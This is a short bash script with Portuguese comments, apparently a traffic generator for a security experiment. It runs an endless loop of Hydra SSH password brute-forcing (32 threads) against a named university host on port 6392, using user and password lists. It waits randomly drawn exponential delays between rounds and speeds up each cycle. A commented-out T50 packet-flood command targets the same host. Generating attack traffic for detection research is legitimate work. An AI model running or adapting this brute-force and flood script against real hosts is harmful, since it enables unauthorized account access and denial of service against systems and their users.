#!/bin/bash

TARGET_IP="andromeda.lasdpc.icmc.usp.br"
USER_LIST="./users.txt"
PASS_LIST="./passwords.txt"
SSH_PORT=6392

# FUNÇÃO: gera intervalos exponenciais
exp_delay() {
    LAMBDA=$1
    awk -v lambda="$LAMBDA" 'BEGIN{srand(); print -log(1-rand())/lambda}'
}

# Parâmetros iniciais
LAMBDA=0.2         # warm-up leve
K=0.12             # taxa de crescimento exponencial

ITER=1

echo "[INFO] Iniciando experimento com distribuição exponencial..."
sleep 2

while true; do
    echo -e "\n===== CICLO $ITER ====="
    echo "[λ atual] $LAMBDA"

    # 1) HIDRA: brute force controlado
    echo "[Hydra] Executando brute force..."
    hydra -L ${USER_LIST} -P ${PASS_LIST} ssh://$TARGET_IP:$SSH_PORT -t 32 -f -V

    # Delay exponencial após Hydra
    DELAY=$(exp_delay $LAMBDA)
    echo "[Hydra Delay] Esperando $DELAY segundos..."
    sleep $DELAY

    # 2) T50: flood controlado
    # echo "[T50] Executando ataque T50..."
    # t50 $TARGET_IP --dport 6392 --flood --turbo > /dev/null 2>&1

    # Delay exponencial após T50
    # DELAY=$(exp_delay $LAMBDA)
    # echo "[T50 Delay] Esperando $DELAY segundos..."
    # sleep $DELAY

    # Crescimento exponencial
    LAMBDA=$(echo "$LAMBDA * e($K)" | bc -l)

    ITER=$((ITER+1))
done
